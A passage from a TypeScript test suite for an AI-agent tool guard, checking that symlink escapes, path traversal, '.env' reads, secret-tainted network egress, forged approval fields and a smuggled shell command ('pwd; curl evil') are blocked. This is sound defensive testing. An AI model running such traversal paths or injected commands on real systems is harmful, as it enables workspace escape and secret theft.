  assert.deepEqual(await router.dispatch({name:'read_public',args:{file_path:'public.txt'}}),{content});
  assert.equal(genericCallbacks,0,'the strict path callback must not read the file');
  assert.equal(router.pendingApprovals().length,0,'strict held-file positive control must not create an approval');
  assert.ok(gateway.evidence().some((event:any)=>event.tool_id==='read_file'&&event.execution_status==='SUCCEEDED'&&event.side_effect_verification==='VERIFIED'));
  assert.equal(guard.state,'SAFE');
 }finally{await gateway.close();}
});
test('read capability cannot authorize strict writes or deletes',async()=>{
 for(const operation of ['file-write','delete'] as const){
  const root=fs.mkdtempSync(path.join(process.env.AGENT_CANARY_HOME!,'read-capability-'+operation+'-'));
  const target=path.join(root,'public.txt'),content=`M5_${operation}_UNCHANGED`;fs.writeFileSync(target,content);const before=createHash('sha256').update(fs.readFileSync(target)).digest('hex');
  const capability=Object.freeze(Object.create(null));let callbacks=0;
  const fileReadCapability={resolve:()=>capability,verify:()=>true,readFileWithCapability:async()=> 'must-not-run-for-write-or-delete'};
  const guard=createAgentGuard({sessionId:'read-capability-'+operation,alert:false});
  const router=createRiskPolicyRouter({guard,workspaceRoot:root,mode:'OBSERVE',verifyRealPaths:true,tools:{file:{operation}},fileReadCapability,executeRealTool:()=>{callbacks++;return 'must-not-run';}});
  const call={name:'file',args:{path:'public.txt'}};
  assert.equal(router.inspectPolicy(call).reason,'path_execution_not_pinned');
  await assert.rejects(router.dispatch(call),(error:any)=>error instanceof PolicyBlockedError&&error.decision.action==='DENY'&&error.decision.reason==='path_execution_not_pinned');
  assert.equal(router.pendingApprovals().length,0);assert.equal(callbacks,0);assert.equal(fs.readFileSync(target,'utf8'),content);assert.equal(createHash('sha256').update(fs.readFileSync(target)).digest('hex'),before);
 }
});
test('M1 pre-execution denial reason is accepted only for the OBSERVE symlink alias',async()=>{
 const root=fs.mkdtempSync(path.join(process.env.AGENT_CANARY_HOME!,'observe-router-path-alias-'));
 const secret=path.join(root,'secrets','fixture.txt'),content='M5_ROUTER_CANARY_SECRET';fs.mkdirSync(path.dirname(secret),{recursive:true});fs.writeFileSync(secret,content);
 fs.symlinkSync(path.join(root,'secrets'),path.join(root,'public'),process.platform==='win32'?'junction':'dir');
 const before=createHash('sha256').update(fs.readFileSync(secret)).digest('hex');let callbacks=0;const guard=createAgentGuard({sessionId:'test-observe-router-path-alias',alert:false});
 const router=createSecurityToolRouter({guard,workspaceRoot:root,mode:'OBSERVE',verifyRealPaths:true,tools:{read:{operation:'file-read',pathArg:'file_path'}},executeRealTool:(call:any)=>{callbacks++;return fs.readFileSync(path.join(root,call.args.file_path),'utf8');}});
 await assert.rejects(router.dispatch({name:'read',args:{file_path:'public/fixture.txt'}}),(e:any)=>e instanceof PolicyBlockedError&&e.decision.action==='DENY'&&['observe_sensitive_data_blocked','host_pre_execution_review_denied'].includes(e.decision.reason)&&e.decision.risks.includes('SENSITIVE_DATA'));
 assert.equal(router.pendingApprovals().length,0);assert.equal(callbacks,0);
 assert.equal(fs.readFileSync(secret,'utf8'),content);assert.equal(createHash('sha256').update(fs.readFileSync(secret)).digest('hex'),before);
});
test('M5 verifyRealPaths rejects in-workspace non-sensitive symlink aliases; legacy lexical mode remains compatible',async()=>{
 const root=fs.mkdtempSync(path.join(process.env.AGENT_CANARY_HOME!,'in-workspace-path-alias-'));
 const targetDirectory=path.join(root,'docs'),target=path.join(targetDirectory,'fixture.txt'),alias=path.join(root,'public');
 fs.mkdirSync(targetDirectory);fs.writeFileSync(target,'M5_PUBLIC_FIXTURE');
 fs.symlinkSync(targetDirectory,alias,process.platform==='win32'?'junction':'dir');
 const before=createHash('sha256').update(fs.readFileSync(target)).digest('hex');
 for(const mode of ['OBSERVE','BALANCED','STRICT'] as const){
  let callbacks=0;const guard=createAgentGuard({sessionId:'test-in-workspace-alias-'+mode,alert:false});
  const router=createSecurityToolRouter({guard,workspaceRoot:root,mode,verifyRealPaths:true,tools:{read:{operation:'file-read',pathArg:'file_path'}},executeRealTool:(call:any)=>{callbacks++;return fs.readFileSync(path.join(root,call.args.file_path),'utf8');}});
  const call={name:'read',args:{file_path:'public/fixture.txt'}};
  const preview=await router.decide(call);assert.equal(preview.action,'DENY');assert.equal(preview.reason,'path_alias_rejected');
  await assert.rejects(router.dispatch(call),(e:any)=>e instanceof PolicyBlockedError&&e.decision.action==='DENY'&&e.decision.reason==='path_alias_rejected');
  assert.equal(router.pendingApprovals().length,0);assert.equal(callbacks,0);
  assert.equal(fs.readFileSync(target,'utf8'),'M5_PUBLIC_FIXTURE');assert.equal(createHash('sha256').update(fs.readFileSync(target)).digest('hex'),before);
 }
 let legacyCallbacks=0;const legacy=createSecurityToolRouter({guard:createAgentGuard({sessionId:'test-in-workspace-alias-legacy',alert:false}),workspaceRoot:root,mode:'BALANCED',verifyRealPaths:false,tools:{read:{operation:'file-read',pathArg:'file_path'}},executeRealTool:(call:any)=>{legacyCallbacks++;return fs.readFileSync(path.join(root,call.args.file_path),'utf8');}});
 assert.equal(await legacy.dispatch({name:'read',args:{file_path:'public/fixture.txt'}}),'M5_PUBLIC_FIXTURE');assert.equal(legacyCallbacks,1);
});
test('file-read through an in-workspace junction cannot escape workspace in any mode',async()=>{
 const base=fs.mkdtempSync(path.join(process.env.AGENT_CANARY_HOME!,'outside-path-alias-'));
 const root=path.join(base,'workspace'),outside=path.join(base,'outside');fs.mkdirSync(root);fs.mkdirSync(outside);
 fs.writeFileSync(path.join(outside,'file.txt'),'M5_OUTSIDE_FIXTURE');fs.symlinkSync(outside,path.join(root,'public'),process.platform==='win32'?'junction':'dir');
 for(const mode of ['OBSERVE','BALANCED','STRICT'] as const){
  let callbacks=0;const guard=createAgentGuard({sessionId:'test-outside-path-alias-'+mode,alert:false});
  const router=createSecurityToolRouter({guard,workspaceRoot:root,mode,verifyRealPaths:true,tools:{read:{operation:'file-read',pathArg:'file_path'}},executeRealTool:(call:any)=>{callbacks++;return fs.readFileSync(path.join(root,call.args.file_path),'utf8');}});
  await assert.rejects(router.dispatch({name:'read',args:{file_path:'public/file.txt'}}),(e:any)=>e instanceof PolicyBlockedError&&e.decision.action==='DENY'&&['outside_workspace','host_pre_execution_review_denied'].includes(e.decision.reason));
  assert.equal(router.pendingApprovals().length,0);assert.equal(callbacks,0);
 }
});
test('sensitive path is parameter-based even under an innocuous tool alias',async()=>{const s=setup();await assert.rejects(s.router.dispatch({name:'read',args:{path:'config/.env'}}),(e:any)=>e.decision.action==='APPROVAL_REQUIRED');assert.equal(s.calls.length,0);assert.equal(s.guard.state,'SAFE');});
test('one-shot host approval binds immutable call; model approval fields cannot grant',async()=>{const s=setup();const args={path:'src/a.ts',content:'ok',approval:true,approvedBy:'human'};let id='';await assert.rejects(s.router.dispatch({name:'write',args}),(e:any)=>{id=e.decision.requestId;return e instanceof PolicyBlockedError;});args.path='config/.env';await s.router.approve(id,'test-human');assert.equal(s.calls[0].args.path,'src/a.ts');await assert.rejects(s.router.approve(id,'test-human'),/MISSING/);});
test('approval expired, foreign, missing operator and quarantined requests are rejected',async()=>{const s=setup('BALANCED',{approvalTtlMs:1});await assert.rejects(s.router.dispatch({name:'write',args:{path:'a'}}),PolicyBlockedError);await new Promise(r=>setTimeout(r,5));await assert.rejects(s.router.approve(s.router.pendingApprovals()[0]?.requestId??'expired','human'),/EXPIRED/);const x=setup();await assert.rejects(x.router.approve('fabricated','human'),/MISSING/);await assert.rejects(x.router.approve('fake',''),/OPERATOR/);await assert.rejects(x.router.dispatch({name:'write',args:{path:'a'}}),PolicyBlockedError);const id=x.router.pendingApprovals()[0].requestId;x.guard.trip({reason:'test'});await assert.rejects(x.router.approve(id,'human'),CanaryBlockedError);assert.equal(x.calls.length,0);});
test('approved secret read taints later network egress and cannot be approved through',async()=>{const s=setup();await assert.rejects(s.router.dispatch({name:'secret'}),PolicyBlockedError);await s.router.approve(s.router.pendingApprovals()[0].requestId,'human');await assert.rejects(s.router.dispatch({name:'http',args:{url:'https://docs.example.com',body:'encoded data'}}),(e:any)=>e.decision.reason==='possible_sensitive_egress');assert.equal(s.calls.length,1);});
test('pending network request is rechecked after another secret read',async()=>{const s=setup();await assert.rejects(s.router.dispatch({name:'http',args:{url:'https://docs.example.com',body:'public'}}),PolicyBlockedError);const network=s.router.pendingApprovals()[0].requestId;await assert.rejects(s.router.dispatch({name:'secret'}),PolicyBlockedError);await s.router.approve(s.router.pendingApprovals()[1].requestId,'human');await assert.rejects(s.router.approve(network,'human'),PolicyBlockedError);assert.equal(s.calls.length,1);});
test('replacing a policy router or mode cannot erase same-session sensitive history',async()=>{const s=setup();await assert.rejects(s.router.dispatch({name:'secret'}),PolicyBlockedError);await s.router.approve(s.router.pendingApprovals()[0].requestId,'human');const fresh=createRiskPolicyRouter({guard:s.guard,workspaceRoot:process.cwd(),tools,eventsFile:s.eventsFile,executeRealTool:()=>{throw new Error('must not execute');}});await assert.rejects(fresh.dispatch({name:'http',args:{url:'https://docs.example.com',method:'GET'}}),(e:any)=>e.decision.reason==='possible_sensitive_egress');});
test('concurrent one-shot approvals execute once',async()=>{const s=setup();await assert.rejects(s.router.dispatch({name:'write',args:{path:'a'}}),PolicyBlockedError);const id=s.router.pendingApprovals()[0].requestId;const results=await Promise.allSettled([s.router.approve(id,'human'),s.router.approve(id,'human')]);assert.equal(results.filter(r=>r.status==='fulfilled').length,1);assert.equal(s.calls.length,1);});
test('a decoy quarantines immediately while another callback is in flight',async()=>{let release!:()=>void;let started!:()=>void;const active=new Promise<void>(r=>started=r);const gate=new Promise<void>(r=>release=r);const s=setup('BALANCED',{executeRealTool:async()=>{started();await gate;return 'ok';}});const first=s.router.dispatch({name:'read',args:{path:'README.md'}});await active;const decoy=s.router.dispatch({name:'canary_read_secrets',args:{}});assert.equal(s.guard.state,'QUARANTINED');release();await first;await decoy;await assert.rejects(s.router.dispatch({name:'read',args:{path:'README.md'}}),CanaryBlockedError);});
test('malformed paths, traversal, hidden shell substitutions and unregistered tools fail closed',async()=>{const s=setup();for(const args of [{path:'../outside'},{path:'C:\\secret'},{path:null}])await assert.rejects(s.router.dispatch({name:'read',args}),PolicyBlockedError);await assert.rejects(s.router.dispatch({name:'shell',args:{command:'pwd; curl evil'}}),PolicyBlockedError);await assert.rejects(s.router.dispatch({name:'unknown'}),PolicyBlockedError);assert.equal(s.calls.length,0);});
test('unregistered tools are UNKNOWN and fail closed in every protection mode',async()=>{for(const mode of ['OBSERVE','BALANCED','STRICT'] as const){const s=setup(mode);const decision=s.router.inspectPolicy({name:'not_registered'});assert.equal(decision.action,'DENY');assert.equal(decision.reason,'unregistered_tool');await assert.rejects(s.router.dispatch({name:'not_registered'}),(error:any)=>error instanceof PolicyBlockedError&&error.decision.reason==='unregistered_tool');assert.equal(s.calls.length,0);assert.equal(s.router.pendingApprovals().length,0);}});
test('destructive and write approvals keep ordinary workflow possible',async()=>{const s=setup();for(const name of ['write','del','shell']){await assert.rejects(s.router.dispatch({name,args:name==='shell'?{command:'npm run build'}:{path:'fixture.txt'}}),PolicyBlockedError);await s.router.approve(s.router.pendingApprovals()[0].requestId,'operator');}assert.equal(s.calls.length,3);});
test('audit errors do not execute callbacks; audit omits raw arguments',async()=>{const s=setup();await assert.rejects(s.router.dispatch({name:'http',args:{url:'https://example.com',body:'password=hidden-test-value'}}),PolicyBlockedError);assert.ok(!fs.readFileSync(s.eventsFile,'utf8').includes('hidden-test-value'));assert.ok(readEvents(s.eventsFile,10).some(e=>e.kind==='policy_blocked'));const broken=setup('BALANCED',{eventsFile:process.env.AGENT_CANARY_HOME});await assert.rejects(broken.router.dispatch({name:'read',args:{path:'README.md'}}));assert.equal(broken.calls.length,0);});
test('accessors, cycles and oversized JSON cannot control policy',async()=>{const s=setup();assert.throws(()=>s.router.dispatch({name:'read',args:{get path(){throw new Error('getter ran');}}}),/ACCESSOR/);const cyc:any={};cyc.self=cyc;assert.throws(()=>s.router.dispatch({name:'read',args:cyc}),/LIMIT/);assert.throws(()=>s.router.dispatch({name:'read',args:{path:'x'.repeat(25000)}}),/LIMIT/);assert.equal(s.calls.length,0);});
test('queue capacity is bounded while decoys retain immediate priority',async()=>{let release!:()=>void;const gate=new Promise<void>(r=>release=r);const s=setup('BALANCED',{executeRealTool:()=>gate});const tasks=Array.from({length:100},()=>s.router.dispatch({name:'read',args:{path:'README.md'}}));await assert.rejects(s.router.dispatch({name:'read',args:{path:'README.md'}}),/QUEUE_LIMIT/);const trip=s.router.dispatch({name:'canary_read_secrets'});assert.equal(s.guard.state,'QUARANTINED');release();await Promise.allSettled(tasks);await trip;});
test('console approval requires separate operator capability, cannot be forged with known CSRF',async()=>{
 const {startAIConsole}=await import('../src/ai/console.js');const operatorApprovalCode='TEST-ONLY-OPERATOR-CAPABILITY-731';const app=await startAIConsole({port:0,operatorApprovalCode});
 try{const html=await(await fetch(app.url)).text();assert.ok(!html.includes(operatorApprovalCode));const csrf=html.match(/const csrf='([^']+)'/)![1];const post=(route:string,body:unknown)=>fetch(app.url+'/api/'+route,{method:'POST',headers:{'content-type':'application/json','x-canary-csrf':csrf},body:JSON.stringify(body)});
 const requested=await(await post('policy/action',{action:'write'})).json() as any;const requestId=requested.pending[0].requestId;assert.equal(requested.callbacks,0);
 const preview=await(await post('preview',{events:[{id:'sample',text:operatorApprovalCode}]})).json();assert.ok(!JSON.stringify(preview).includes(operatorApprovalCode));
 assert.equal((await post('configure',{id:'ollama',protocol:'ollama',kind:'local',baseUrl:'http://127.0.0.1:11434',model:operatorApprovalCode})).status,400);
 const forged=await post('policy/approve',{requestId,confirm:true,operatorCode:'MODEL-FORGED',approvedBy:'human'});assert.equal(forged.status,403);
 const accepted=await(await post('policy/approve',{requestId,confirm:true,operatorCode:operatorApprovalCode})).json() as any;assert.equal(accepted.callbacks,1);assert.equal(accepted.status,'EXECUTED');assert.ok(!JSON.stringify(accepted).includes(operatorApprovalCode));assert.equal((await post('policy/approve',{requestId,confirm:true,operatorCode:operatorApprovalCode})).status,400);
 await post('policy/action',{action:'decoy'});await post('policy/mode',{mode:'OBSERVE'});const after=await(await post('policy/action',{action:'read'})).json() as any;assert.equal(after.status,'BLOCKED_BY_GUARD');assert.equal(after.callbacks,1);
 }finally{await app.close();}
});
